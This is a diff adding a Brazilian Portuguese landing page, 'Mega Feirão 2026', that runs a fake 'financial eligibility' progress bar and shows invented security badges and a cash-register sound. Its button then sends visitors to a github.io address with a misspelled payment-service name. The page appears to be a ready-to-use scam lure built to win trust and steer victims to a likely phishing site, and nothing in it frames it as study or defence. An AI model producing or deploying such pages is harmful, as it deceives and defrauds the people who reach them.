@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Mega Feirão 2026 | Acesso Seguro</title>
+
+<style>
+*{
+  margin:0;
+  padding:0;
+  box-sizing:border-box;
+  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+}
+
+body{
+  min-height:100vh;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  background: linear-gradient(160deg, #08162c, #0b2c5f);
+  color:#0b2c5f;
+}
+
+.container{
+  width:92%;
+  max-width:420px;
+  background:#ffffff;
+  border-radius:22px;
+  padding:32px 22px;
+  text-align:center;
+  box-shadow:0 20px 60px rgba(0,0,0,0.35);
+  position:relative;
+}
+
+.badge{
+  display:inline-block;
+  background:rgba(212,175,55,0.15);
+  color:#b8962e;
+  padding:6px 14px;
+  border-radius:20px;
+  font-size:12px;
+  font-weight:600;
+  margin-bottom:14px;
+}
+
+h1{
+  font-size:26px;
+  font-weight:800;
+  color:#0b2c5f;
+  margin-bottom:6px;
+}
+
+h2{
+  font-size:15px;
+  font-weight:500;
+  color:#555;
+  margin-bottom:26px;
+  line-height:1.4;
+}
+
+.status{
+  font-size:14px;
+  font-weight:600;
+  color:#0b2c5f;
+  margin-bottom:10px;
+}
+
+.progress-bar{
+  width:100%;
+  height:14px;
+  background:#e4e7ec;
+  border-radius:20px;
+  overflow:hidden;
+  margin-bottom:10px;
+}
+
+.progress{
+  height:100%;
+  width:0%;
+  background:linear-gradient(90deg, #0b2c5f, #1565c0);
+  transition:width 0.12s linear;
+}
+
+.percent{
+  font-size:15px;
+  font-weight:700;
+  color:#0b2c5f;
+  margin-bottom:22px;
+}
+
+.security{
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  gap:8px;
+  font-size:12px;
+  color:#2e7d32;
+  margin-bottom:20px;
+}
+
+.check{
+  font-size:56px;
+  color:#2ecc71;
+  animation:check 0.6s ease forwards;
+}
+
+@keyframes check{
+  from{transform:scale(0);opacity:0}
+  to{transform:scale(1);opacity:1}
+}
+
+button{
+  width:100%;
+  padding:18px;
+  font-size:17px;
+  font-weight:700;
+  color:#fff;
+  background:linear-gradient(90deg, #0b2c5f, #1565c0);
+  border:none;
+  border-radius:16px;
+  cursor:pointer;
+  box-shadow:0 8px 25px rgba(11,44,95,0.45);
+}
+
+button:active{
+  transform:scale(0.97);
+}
+
+.footer{
+  margin-top:18px;
+  font-size:11px;
+  color:#777;
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+  <div class="badge">ACESSO RESTRITO • 2026</div>
+
+  <h1>Mega Feirão</h1>
+  <h2>Condições exclusivas disponíveis para seu perfil</h2>
+
+  <div class="status" id="statusText">Analisando elegibilidade financeira…</div>
+
+  <div class="progress-bar">
+    <div class="progress" id="progress"></div>
+  </div>
+
+  <div class="percent" id="percent">0%</div>
+
+  <div class="security">
+    🔒 Ambiente seguro e verificado
+  </div>
+
+  <div id="icon"></div>
+
+  <button onclick="acessar()">Prosseguir para o Acesso</button>
+
+  <div class="footer">
+    Sistema automático • Dados protegidos
+  </div>
+
+</div>
+
+<audio id="sound">
+  <source src="https://assets.mixkit.co/sfx/preview/mixkit-cash-register-purchase-873.mp3" type="audio/mpeg">
+</audio>
+
+<script>
+const LINK = "https://servicodepagamentsfoll.github.io/feirao/";
+let p = 0;
+
+const bar = document.getElementById("progress");
+const per = document.getElementById("percent");
+const status = document.getElementById("statusText");
+const icon = document.getElementById("icon");
+const sound = document.getElementById("sound");
+
+const timer = setInterval(()=>{
+  p++;
+  bar.style.width = p + "%";
+  per.innerText = p + "%";
+
+  if(p === 40){
+    status.innerText = "Validando critérios financeiros…";
+  }
+
+  if(p === 75){
+    status.innerText = "Preparando liberação segura…";
+  }
+
+  if(p >= 100){
+    clearInterval(timer);
+    status.innerText = "Acesso autorizado para condições exclusivas";
+    sound.play();
+    icon.innerHTML = "<div class='check'>✔</div>";
+  }
+}, 35);
+
+function acessar(){
+  window.location.href = LINK;
+}
+</script>
+
+</body>
+</html>
